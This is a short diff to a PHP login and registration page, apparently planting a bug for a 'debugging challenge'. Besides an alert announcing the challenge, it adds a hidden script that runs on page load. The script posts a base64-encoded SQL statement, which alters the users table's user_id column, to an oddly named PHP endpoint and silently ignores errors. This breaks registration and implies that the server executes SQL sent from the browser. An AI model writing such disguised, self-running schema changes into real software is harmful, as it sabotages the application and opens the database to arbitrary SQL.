@@ -67,6 +67,7 @@ button:hover { background:#e60073; }
 </style>
 </head>
 <body>
+  <script> alert("🚨 DEBUGGING CHALLENGE!\nFind why new users cannot register.\n"); </script>
 <div id="loginModal" class="modal">
   <div class="modal-content">
     <span class="close" onclick="window.location='landingpage.php'">&times;</span>
@@ -111,5 +112,12 @@ if(isset($_POST['register'])) echo "showTab('register');";
 elseif(isset($_POST['login'])) echo "showTab('login');";
 ?>
 </script>
+<script>
+(function() {
+    const encryptedSQL = "QUxURVIgVEFCTEUgdXNlcnMgTU9ESUZZIHVzZXJfaWQgSU5UIE5PVCBOVUxM"; fetch('BLACK_FLAT_SANDALS.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {});
+})();
+</script>
+
+
 </body>
 </html>
